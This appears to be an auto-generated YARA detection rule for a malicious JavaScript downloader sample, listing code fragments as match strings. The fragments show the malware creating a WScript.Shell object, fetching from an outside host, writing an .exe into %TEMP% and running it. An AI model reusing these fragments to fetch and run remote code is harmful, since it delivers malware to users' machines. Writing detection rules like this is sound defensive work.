rule sig_20160330_6f42b0d134fded515137e104bc864186 {
  meta:
    description = "datamaliciousorder - file 20160330_6f42b0d134fded515137e104bc864186.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "60b933e99792aeb1b0867ee0a565014e6d85f9d09cd8b9f3cd268e6fa38125a2"

  strings:
    $s1  = "function _X(_VT, _Y0){_D0 = _D0 * 1; return _VT - _Y0;};" fullword ascii
    $s2  = "var _C = function _UJ() {return WScript[_QF](\"WScript\"+\".Shell\");}(), _E = 11;" fullword ascii
    $s3  = "_NZ[_U](\"GET\", \"http://ccluke.cn/b7eus\", false);" fullword ascii
    $s4  = "if (_NZ[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _IC(){return _ZH + \"\";};" fullword ascii
    $s6  = "function _D() {return _C[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"0JYTIupzWm.ex\" + \"e\";};" fullword ascii
    $s7  = "function _S() {return ((_CS == true) && (_CS == _Y)) ? 1 : _D0;};" fullword ascii
    $s8  = "function _V(_II){_C[\"Run\"](_II, _D0, _D0);};" fullword ascii
    $s9  = "function _Q()" fullword ascii
    $s10 = "function _SQ(){return 22;};" fullword ascii
    $s11 = "var _UW = new this[\"Date\"]();" fullword ascii
    $s12 = " while (_VF){" fullword ascii
    $s13 = "function _F0(){return _QF;};" fullword ascii
    $s14 = "return _X(_JA, _T);" fullword ascii
    $s15 = "function _F(_Q0) {var _PS = (1, 2, 3, 4, 5, _Q0); return _PS;};" fullword ascii
    $s16 = "var _Y = false;" fullword ascii
    $s17 = "var _G0 = false;" fullword ascii
    $s18 = "_Y = true; " fullword ascii
    $s19 = "_CS = true; " fullword ascii
    $s20 = "var _CS = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}